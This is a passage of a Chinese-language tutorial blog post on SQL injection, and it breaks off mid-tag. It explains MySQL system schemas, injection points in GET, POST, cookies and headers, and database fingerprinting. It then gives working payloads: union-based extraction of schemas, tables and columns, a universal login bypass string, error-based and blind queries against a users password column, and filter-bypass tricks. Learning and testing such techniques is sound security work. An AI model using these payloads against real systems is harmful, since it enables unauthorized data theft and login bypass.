    <url>/2023/10/11/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="01-web网站基础框架"><a href="#01-web网站基础框架" class="headerlink" title="01:web网站基础框架"></a>01:web网站基础框架</h2><h4 id="项目架构："><a href="#项目架构：" class="headerlink" title="项目架构："></a>项目架构：</h4><p><img src="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/image-20231011203622770.png" alt="image-20231011203622770"></p><h4 id="SQL注入的发生"><a href="#SQL注入的发生" class="headerlink" title="SQL注入的发生"></a>SQL注入的发生</h4><img src="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/image-20231011204700027.png" alt="image-20231011204700027" style="zoom:80%;" /><p><img src="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/image-20231011205254395.png" alt="image-20231011205254395"></p><h4 id="SQL注入之数据库概述"><a href="#SQL注入之数据库概述" class="headerlink" title="SQL注入之数据库概述"></a>SQL注入之数据库概述</h4><p>数据库就是一个存储数据的仓库，数据库是以一定方式存储在一起，能与多个用户共享，具有尽可能小的冗余，与应用程序彼此独立的数据集合。</p><h5 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h5><p>关系型数据库，存储的格式可以直观地反映实体间的关系，和常见的表格比较相似</p><p>关系型数据库中表与表之间有很多复杂的关联关系的</p><p>常见的关系型数据库有MySQL，Orcale，PostgreSQL , SQL Server等。</p><h5 id="非关系型数据库"><a href="#非关系型数据库" class="headerlink" title="非关系型数据库"></a>非关系型数据库</h5><p>随着近些年技术方向的不断扩展，大量的NoSQL数据库如 Mon goDB，Redis出于简化数据库结构，避免冗余，影响性能的表连接。摒弃复杂分布式的目的被设计</p><p>NoSQL数据库适合追求速度和可扩展性，业务多变的场景</p><h5 id="SQL语句语法回顾："><a href="#SQL语句语法回顾：" class="headerlink" title="SQL语句语法回顾："></a>SQL语句语法回顾：</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">查询当前数据库服务器所有的数据库<br><span class="hljs-keyword">show</span> databases;<br>选中某个数据库<br>use 数据库名字 test<br>查询当前数据库所有的表<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>；<br>查询t1表所有数据<br>查询关键 <span class="hljs-keyword">select</span> <br>* 所有<br><span class="hljs-keyword">from</span>  表名<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> t1;<br>条件查询 id=<span class="hljs-number">2</span><br><span class="hljs-keyword">where</span> 条件  编程 <span class="hljs-keyword">if</span>（条件 <span class="hljs-keyword">true</span>）&#123;执行&#125;<br><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> t1 <span class="hljs-keyword">where</span> id=<span class="hljs-number">2</span>；<br>查询id=<span class="hljs-number">2</span>   pass =<span class="hljs-number">111</span><br><span class="hljs-keyword">union</span> 合并查询 <br><span class="hljs-number">2</span>个特性：<br>前面查询的语句 和 后面的查询语句 结果互不干扰！<br>前面的查询语句的字段数量 和 后面的查询语句字段数量  要一致<br><br>* == <span class="hljs-number">3</span><br><span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> t1 <span class="hljs-keyword">where</span> id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> t1 <span class="hljs-keyword">where</span> pass =<span class="hljs-number">111</span>;<br><br><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> 排序<br><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> 字段名字  id  也可以 跟上数字 <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> .。。。。。<br><br>猜解表的列数 知道表有几列 <br></code></pre></td></tr></table></figure><h4 id="系统库释义"><a href="#系统库释义" class="headerlink" title="系统库释义"></a>系统库释义</h4><img src="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/image-20231011205657206.png" alt="image-20231011205657206" style="zoom:80%;" /><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span>information_schema 库：是信息数据库，其中保存着关于MySQL服务器所维护的所有其他数据库的信息；<br><br>SCHEMATA 表：提供了当前MySQL实例中所有数据库信息， <span class="hljs-keyword">show</span> databases结果取之此表。<br><br><span class="hljs-keyword">TABLES</span>表：提供了关于数据中表的信息。<span class="hljs-built_in">table_name</span><br><br><span class="hljs-keyword">COLUMNS</span>表：提供了表的列信息，详细描述了某张表的所有列以及每个列的信息。<span class="hljs-built_in">column_name</span><br><br><span class="hljs-number">2</span>、performance_schema库具有<span class="hljs-number">87</span>张表。<br>MySQL <span class="hljs-number">5.5</span>开始新增一个数据库：PERFORMANCE_SCHEMA，主要用于收集数据库服务器性能参数。内存数据库，数据放在内存中直接操作的数据库。相对于磁盘，内存的数据读写速度要高出几个数量级。<br><br><span class="hljs-number">3</span>、mysql库是核心数据库，类似于<span class="hljs-keyword">sql</span> <span class="hljs-keyword">server</span>中的master表，主要负责存储数据库的用户（账户）信息、权限设置、关键字等mysql自己需要使用的控制和管理信息。不可以删除，如果对mysql不是很了解，也不要轻易修改这个数据库里面的表信息。<br>常用举例：在mysql.<span class="hljs-keyword">user</span>表中修改root用户的密码<br><br><span class="hljs-number">4</span>、sys库具有<span class="hljs-number">1</span>个表，<span class="hljs-number">100</span>个视图。<br>sys库是MySQL <span class="hljs-number">5.7</span>增加的系统数据库，这个库是通过视图的形式把information_schema和performance_schema结合起来，查询出更加令人容易理解的数据。<br>可以查询谁使用了最多的资源，哪张表访问最多等。<br></code></pre></td></tr></table></figure><h4 id="SQL注入的产生需要满足以下两个条件"><a href="#SQL注入的产生需要满足以下两个条件" class="headerlink" title="SQL注入的产生需要满足以下两个条件"></a><strong>SQL注入的产生需要满足以下两个条件</strong></h4><ol><li>参数用户可控：前端传给后端的参数用户可控。</li><li>参数带入数据库查询：传入的参数拼接到SQL语句中，且带入数据库中查询。</li></ol><h4 id="SQL注入基础危害："><a href="#SQL注入基础危害：" class="headerlink" title="SQL注入基础危害："></a>SQL注入基础危害：</h4><p>）盗取网站的敏感信息;<br>）绕过网站后台认证 后台登录语句： SELECT * FROM admin WHERE Username&#x3D;‘user’ and Password&#x3D;‘pass’ 万能密码：‘or ’1‘ &#x3D; ’1‘ # ;<br>）借助SQL注入漏洞提权获取系统权限;<br>）读取文件信息。</p><h4 id="MYSQL数据库注入-常用函数："><a href="#MYSQL数据库注入-常用函数：" class="headerlink" title="MYSQL数据库注入-常用函数："></a>MYSQL数据库注入-常用函数：</h4><p>（1）user() 返回当前使用数据库的用户，也就是网站配置文件中连接数据库的账号 </p><p>（2）version() 返回当前数据库的版本 </p><p>（3）database() 返回当前使用的数据库，只有在use命令选择一个数据库之后，才能查到 （4）group_concat() 把数据库中的某列数据或某几列数据合并为一个字符串 </p><p>（5）@@datadir 数据库路径 </p><p>（6）@@version_compile_os 操作系统版本</p><h4 id="SQL-联合-注入流程："><a href="#SQL-联合-注入流程：" class="headerlink" title="SQL(联合)注入流程："></a>SQL(联合)注入流程：</h4><ol><li><p>?id&#x3D;1 and 1&#x3D;1</p></li><li><p>判断有无闭合 and 1&#x3D;1 and 1&#x3D;2 &#x2F;&#x2F;结果和第一个一样说明需要闭合，反之无闭合 有闭合则需要用到 –+闭合</p></li><li><p>猜解字段 order by 10 &#x2F;&#x2F;采用二分法</p></li><li><p>判断数据回显位置 -1 union select 1，2，3，4，5…. &#x2F;&#x2F;参数等号后面加-表示不显示当前数据</p></li><li><p>获取当前数据库名、用户、版本 union select version(),database()，user()，4…… 4、获取全部数据库名</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">union <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-built_in">select</span> <span class="hljs-built_in">group</span>\<span class="hljs-variable">_concat</span>(schema\<span class="hljs-variable">_name</span>)<span class="hljs-keyword">from</span> information\<span class="hljs-variable">_schema</span>.schemata)<br></code></pre></td></tr></table></figure></li><li><p>获取表名：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group</span>\_concat(<span class="hljs-keyword">table</span>\_name)<span class="hljs-keyword">from</span> information\_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">table</span>\_schema=<span class="hljs-string">&#x27;库名&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>获取字段名：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group</span>\_concat(<span class="hljs-keyword">column</span>\_name)<span class="hljs-keyword">from</span> information\_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">table</span>\_name=<span class="hljs-string">&#x27;表名&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>获取数据 union select 1,2,(select group_concat(字段1，字段2)from 库名.表名<br>函数名称： 函数功能：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">查 库： <span class="hljs-keyword">select</span> <span class="hljs-keyword">schema</span>\_name <span class="hljs-keyword">from</span> information\_schema.<span class="hljs-keyword">schema</span><br>查 表： <span class="hljs-keyword">select</span> <span class="hljs-keyword">table</span>\_name <span class="hljs-keyword">from</span> information\_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">table</span>\_schema=库名<br>查 列： <span class="hljs-keyword">select</span> <span class="hljs-keyword">column</span>\_name <span class="hljs-keyword">from</span> information\_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">table</span>\_name=表名<br>查数据： <span class="hljs-keyword">select</span> 列名 <span class="hljs-keyword">from</span> 库名.表名<br></code></pre></td></tr></table></figure></li></ol><p>总结–普通SQL注入必备条件：<br>1、界面能够回显数据库查询到的数据（必要条件）；<br>2、界面回显内容至少能够显示数据库中的某列数据（必要条件）；<br>3、部分能够直接提供数据库报错内容的回显；</p><h2 id="SQL注入思路"><a href="#SQL注入思路" class="headerlink" title="SQL注入思路"></a>SQL注入思路</h2><h3 id="1）判断是否可以注入"><a href="#1）判断是否可以注入" class="headerlink" title="1）判断是否可以注入"></a>1）判断是否可以注入</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">在<span class="hljs-meta">GET</span>参数、POST参数、Cookie、Referer、XFF、UA等地方尝试插入代码、符号或语句，尝试是否存在数据库参数读取行为，以及能否对其参数产生影响，如产生影响则说明存在注入点。<br></code></pre></td></tr></table></figure><h3 id="2）sql注入点类型"><a href="#2）sql注入点类型" class="headerlink" title="2）sql注入点类型"></a>2）sql注入点类型</h3><ol><li>get注入<br>在get传参时写入参数，将SQl语句闭合，后面加写入自己的SQL语句。</li><li>post注入<br>通过post传参，原理与get一样，重要的是判断我们所输入的信息是否与数据库产生交互，其次判断SQL语句是如何闭合的。</li><li>有些网站通过查询cookie判断用户是否登录，需要与数据库进行交互，我们可以修改cookie的值，查找我们所需要的东西。或者通过报错注入是网页返回报错信息。</li><li>Referer注入<br>Referer正确写法应该是Referrer,因为http规定时写错只能将错就错，有些网站会记录ip和访问路径，例如百度就是通过Referer来统计网站流量，我们将访问路径进行SQL注入，同样也可以得到想要的信息。</li><li>XFF注入<br>在用户登录注册模块在 HTTP 头信息添加 X-Forwarded-for: 9.9.9.9’ ，用户在注册的时候，如果存在安全隐 患，会出现错误页面或者报错。从而导致注册或者登录用户失败。<br>burpsuite 抓包，提交输入检测语句：</li></ol><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">X-Forwarded-for: 127.0.0.1&#x27;and 1=1#<br>X-Forwarded-for: 127.0.0.1&#x27;and 1=2#<br></code></pre></td></tr></table></figure><p>​两次提交返回不一样，存在 SQL 注入漏洞</p><ol start="6"><li>UA注入<br>输入点在User-Agent</li></ol><h3 id="3）判断数据库类型"><a href="#3）判断数据库类型" class="headerlink" title="3）判断数据库类型"></a>3）判断数据库类型</h3><p>判断网站使用的是哪个数据库，常见数据库如：<br>MySQL、MSSQL(即SQLserver)、Oracle、Access、PostgreSQL、db2等等</p><p>在实际测试过程中尝试进行SQL注入第一步就是判断数据库类型，因为我们不容易知道对方使用的是什么数据库。<br>目前来说，企业使用MSSQL即SQLserver的数量最多，MySQL其次，Oracle再次。除此之外的几个常见数据库如 Access、PostgreSQL、db2则要少的多的多。<br>常用SQL注入判断数据库方法<br>● 使用数据库特有的函数来判断<br>● 使用数据库专属符号来判断，如注释符号、多语句查询符等等<br>● 报错信息判断<br>● 数据库特性判断</p><p>端口扫描：</p><p>如果可以对主机进行端口扫描，可以根据是否开启对应端口，来大概判断数据库类型。<br>Oracle<br>默认端口号：1521<br>SQL Server<br>默认端口号：1433<br>MySQL<br>默认端口号：3306<br>PostgreSql<br>默认端口号：5432</p><p>网站类型与数据库的联系</p><p>asp：SQL Server，Access<br>.net ：SQL Server<br>php：Mysql，PostgreSql<br>java：Oracle，Mysql</p><p>根据注释符判断</p><p>“#”是MySQL中的注释符，返回错误说明该注入点可能不是MySQL，另外也支持’– ‘,和&#x2F;* *&#x2F;注释（注意mysql使用– 时需要后面添加空格）</p><p>“null”和“%00”是Access支持的注释。</p><p>“–”是Oracle和MSSQL支持的注释符，如果返回正常，则说明为这两种数据库类型之一。</p><p>“;”是子句查询标识符，Oracle不支持多行查询，因此如果返回错误，则说明很可能是Oracle数据库。</p><p>根据数据库特有表进行判断</p><p>1、mssql数据库</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://127.0.0.1/test.php?id=1 and (select count(\*) from sysobjects)&gt;0 and 1=1<br></code></pre></td></tr></table></figure><p>2、access数据库</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://127.0.0.1/test.php?id=1 and (select count(\*) from msysobjects)&gt;0 and 1=1<br></code></pre></td></tr></table></figure><p>3、mysql数据库(mysql版本在5.0以上)</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://127.0.0.1/test.php?id=1 and (select count(\*) from information\_schema.TABLES)&gt;0 and 1=1<br></code></pre></td></tr></table></figure><p>4、oracle数据库</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://127.0.0.1/test.php?id=1 and (select count(\*) from sys.user\_tables)&gt;0 and 1=1<br></code></pre></td></tr></table></figure><p>根据其返回的错误类型</p><p><strong>ORACLE</strong><br>ORA-01756:quoted string not properly terminated<br>ORA-00933:SQLcommand not properly ended<br><strong>MS-SQL</strong><br>Msg 170,level 15, State 1,Line 1<br>Line 1:Incorrect syntax near ‘foo<br>Msg 105,level 15,state 1,Line 1<br>Unclose quotation mark before the character string ‘foo<br><strong>MYSQL</strong><br>you have an error in your SQL syntax,check the manual that corresponds to you mysql server version for the right stntax to use near ‘’foo’ at line x</p><h3 id="4）判断参数数据类型"><a href="#4）判断参数数据类型" class="headerlink" title="4）判断参数数据类型"></a>4）判断参数数据类型</h3><p>通过+1、-1、and 1&#x3D;1、and 1&#x3D;2、注释符。与其各种变种如与各种符号结合的and 1&#x3D;1、and ‘1’&#x3D;’1等等判断参数数据类型。先判断是否是整型，如果不是整型则为字符型，字符型存在多种情况，需要使用单引号【’】、双引号【”】、括号【()】多种组合方式进行试探。<br>类似判断闭合方式<br>id&#x3D;1 and 1&#x3D;1回显正常 id&#x3D;1 and1&#x3D;2回显错误（判断为整形）<br>【原因：and 1&#x3D;1或者and 1&#x3D;2 写入了sql语句并且执行成功 因为1&#x3D;2是错误所以id&#x3D;1 and 1&#x3D;2回显是错误的】<br>id&#x3D;1 and 1&#x3D;1和id&#x3D;1 and 1&#x3D;2回显正常（判断为字符型接下来判断闭合方式）<br>id&#x3D;1’ and ‘1’&#x3D;’1回显正确id&#x3D;1’ and ‘1’&#x3D;’2回显错误（判断为【’】闭合）<br>id&#x3D;1” and “1”&#x3D;”1 回显正常 id&#x3D;1” and “1”&#x3D;”2回显错误（判断为【”】闭合）<br>【原因同上】<br>判断为闭合方式为【’】型<br>以上注入不成功的时候尝试<br>1%df’ 此为宽字节注入<br>参数类型一般有数值型，字符型</p><p>数值型</p><p>前台页面输入的参数是「数字」。<br>比如下面这个根据ID查询用户的功能。</p><p>后台对应的SQL如下，字段类型是数值型，这种就是数值型注入。<br>select * from user where id &#x3D; 1;<br>写入and1&#x3D;1 与and1&#x3D;2回显不相同说明后面的and1&#x3D;1和and1&#x3D;2对网页造成了影响，判断为数值型</p><p>字符型</p><p>前台页面输入的参数是「字符串」。<br>比如下面这个登录功能，输入的用户名和密码是字符串。</p><p>后台对应的SQL如下，字段类型是字符型，这种就是字符型注入。<br>select * from user<br>where username &#x3D; ‘zhangsan’ and password &#x3D; ‘123abc’;<br>字符可以使用单引号包裹，也可以使用双引号包裹，根据包裹字符串的「引号」不同，字符型注入可以分为：「单引号字符型」注入和「双引号字符型」注入。</p><p>1）单引号字符型注入<br>参数使用「单引号」包裹时，叫做单引号字符型注入，比如下面这个SQL，就是单引号字符型注入。<br>select * from user where username &#x3D; ‘zhangsan’;<br>2）双引号字符型注入<br>参数使用「双引号」包裹时，叫做双引号字符型注入，比如下面这个SQL，就是双引号字符型注入。<br>select * from user where username &#x3D; “zhangsan”;<br>3）带有括号的注入<br>理论上来说，只有数值型和字符型两种注入类型。<br>SQL的语法，支持使用一个或多个「括号」包裹参数，使得这两个基础的注入类型存在一些变种。<br>a. 数值型+括号的注入<br>使用括号包裹数值型参数，比如下面这种SQL。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> \* <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = (<span class="hljs-number">1</span>);<br><span class="hljs-keyword">select</span> \* <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = ((<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><p>包裹多个括号……<br>b. 单引号字符串+括号的注入<br>使用括号和单引号包裹参数，比如下面这种SQL。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> \* <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = (<span class="hljs-string">&#x27;zhangsan&#x27;</span>);<br><span class="hljs-keyword">select</span> \* <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = ((<span class="hljs-string">&#x27;zhangsan&#x27;</span>));<br></code></pre></td></tr></table></figure><p>包裹多个括号……<br>c. 双引号字符串+括号的注入<br>使用括号和双引号包裹参数，比如下面这种SQL</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> \* <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = (<span class="hljs-string">&quot;zhangsan&quot;</span>);<br><span class="hljs-keyword">select</span> \* <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = ((<span class="hljs-string">&quot;zhangsan&quot;</span>));<br></code></pre></td></tr></table></figure><p>包裹多个括号……</p><h3 id="5）判断数据库语句过滤情况"><a href="#5）判断数据库语句过滤情况" class="headerlink" title="5）判断数据库语句过滤情况"></a>5）判断数据库语句过滤情况</h3><p>正常输入sql语句如果通过查看回显来判断语句是否被过滤<br><strong>判断列数</strong><br>如果order by被过滤则尝试绕过，如果无法绕过就无法得到列数，这时就无法使用联合查询注入。<br><strong>判断显示位</strong><br>如果页面没有显示位，同样无法使用联合查询注入。<br><strong>报错信息</strong><br>如果没有报错信息返回，则无法使用报错注入。</p><h3 id="6）绕过-过滤"><a href="#6）绕过-过滤" class="headerlink" title="6）绕过 过滤"></a>6）绕过 过滤</h3><p>正常进行sql注入，通过回显来判断数据是否被过滤</p><h5 id="1、过滤关键字"><a href="#1、过滤关键字" class="headerlink" title="1、过滤关键字"></a>1、过滤关键字</h5><p>过滤关键字应该是最常见的过滤了，因为只要把关键字一过滤，你的注入语句基本就不起作用了。<br>绕过方法：<br>（1）最常用的绕过方法就是用**&#x2F;<strong>&#x2F;，&lt;&gt;，分割关键字</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">sel&lt;&gt;ect<br>sel/**/ect<br></code></pre></td></tr></table></figure><p>（2）根据过滤程度，有时候还可以用双写绕过</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">selselectect<br></code></pre></td></tr></table></figure><p>（3）既然是过滤关键字，大小写应该都会被匹配过滤，所以大小写绕过一般是行不通的。<br>（4）有时候还可以使用编码绕过</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">url编码绕过<br>16进制编码绕过<br>ASCII编码绕过<br></code></pre></td></tr></table></figure><h5 id="2、过滤逗号"><a href="#2、过滤逗号" class="headerlink" title="2、过滤逗号"></a>2、过滤逗号</h5><p>常见的几种注入方法基本上都要使用逗号，要是逗号被过滤了，那就只能想办法绕过了。<br>绕过方法：<br>（1）简单注入可以使用join方法绕过<br>原语句：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">union select 1,2,3<br></code></pre></td></tr></table></figure><p>join语句：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">union select * from (select 1)a join (select 2)b join (select 3)<br></code></pre></td></tr></table></figure><p>（2）对于盲注的那几个函数substr(),mid(),limit</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">substr和mid()可以使用from for的方法解决<br>substr(str from pos for len) //在str中从第pos位截取len长的字符<br>mid(str from pos for len)//在str中从第pos位截取len长的字符<br>limit可以用offset的方法绕过<br>limit 1 offset 1<br>使用substring函数也可以绕过<br>substring(str from pos) //返回字符串str的第pos个字符，索引从1开始<br></code></pre></td></tr></table></figure><h5 id="3、过滤空格"><a href="#3、过滤空格" class="headerlink" title="3、过滤空格"></a>3、过滤空格</h5><p>空格被过滤有以下几种方法绕过：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">（1）双空格 <br>（2）/**/ <br>（3）用括号绕过 <br>（4）用回车代替 //ascii码为chr(13)&amp;chr(10)，url编码为%0d%0a<br></code></pre></td></tr></table></figure><h5 id="4、过滤等号"><a href="#4、过滤等号" class="headerlink" title="4、过滤等号"></a>4、过滤等号</h5><p>如果等号被过滤了我们可以用 like 代替<br>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</p><h5 id="5、过滤大于小于号"><a href="#5、过滤大于小于号" class="headerlink" title="5、过滤大于小于号"></a>5、过滤大于小于号</h5><p>盲注中我们经常需要用到比较符，如果他们被过滤了，我们可以用以下几种方法绕过：<br>（</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">1）greatest(n1,n2,n3,...)//返回其中的最大值<br>（2）strcmp(str1,str2)//当str1=str2，返回0，当str1&gt;str2，返回1，当str1&lt;str2，返回-1<br>（3）in 操作符<br>（4）between   and//选取介于两个值之间的数据范围。这些值可以是数值、文本或者日期。<br></code></pre></td></tr></table></figure><h5 id="6-等价函数绕过"><a href="#6-等价函数绕过" class="headerlink" title="6.等价函数绕过"></a>6.等价函数绕过</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">hex()、bin() ==&gt; ascii() <br>sleep() ==&gt;benchmark() <br>concat_ws()==&gt;group_concat() <br>mid()、substr() ==&gt; substring() <br>@@user ==&gt; user() <br>@@datadir ==&gt; datadir() <br>举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　 <br>或者： substr((select &#x27;password&#x27;),1,1) = 0x70 <br>strcmp(left(&#x27;password&#x27;,1), 0x69) = 1 <br>strcmp(left(&#x27;password&#x27;,1), 0x70) = 0 <br>strcmp(left(&#x27;password&#x27;,1), 0x71) = -1<br></code></pre></td></tr></table></figure><h3 id="7）根据注入情况使用注入方式"><a href="#7）根据注入情况使用注入方式" class="headerlink" title="7）根据注入情况使用注入方式"></a>7）根据注入情况使用注入方式</h3><p>使用id&#x3D;1进行尝试尝试 继续使用order by 查询显示位 union select 1，2，3 查询无显示，即无法得到显示位或无法得到列数时放弃使用联合查询<br>尝试使用报错语句?id&#x3D;1’ and updatexml(1,concat(0x7e,database(),0x7e),1) –+等没有报错信息显示时放弃使用报错注入<br>尝试使用布尔盲注和时间盲注（建议使用工具进行注入）</p><h5 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h5><p>前提：知道列数且页面上有显示位。<br>判断显示位、获取所有数据库名、获取指定数据库所有表名、获取指定数据库指定表中所有字段名、获取具体数据。<br>列数</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">select id,username,password from security.users where id=1 order by 1;<br></code></pre></td></tr></table></figure><p>显示位</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">select id,username,password from security.users where id=1 union select 1,2,3;<br></code></pre></td></tr></table></figure><p>数据库名</p><h5 id="关于将id值设置为0或者负数的解释"><a href="#关于将id值设置为0或者负数的解释" class="headerlink" title="关于将id值设置为0或者负数的解释"></a>关于将id值设置为0或者负数的解释</h5><p>由于我们的语句是插入到原有语句后面，这样就会出现两个SQL语句同时执行，由于SQL查询会默认返回一行数据，所以我们插入的第二行语句的结果就不会被返回，只会返回原有的SQL语句的查询内容。<br>要让数据库查询我们插入的语句，需要让原有SQL语句产生查询错误，注意：查询错误不是语法错误，查询错误只会返回空，不会让语句报错。<br>所以我们可以使id&#x3D;0或id&#x3D;-1，零或负数不会被用作id值，它插入进去一定导致原有SQL语句查询结果为空，我们插入的SQL语句的结果就会被返回。<br>联合查询时union select无法执行时 用union+select代替 接下来的查询语句空格全部用【+】代替</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=-1&#x27; union select 1,2,database() --+<br></code></pre></td></tr></table></figure><p>或所有数据库名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=-1&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata --+<br></code></pre></td></tr></table></figure><p>指定数据库中表名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 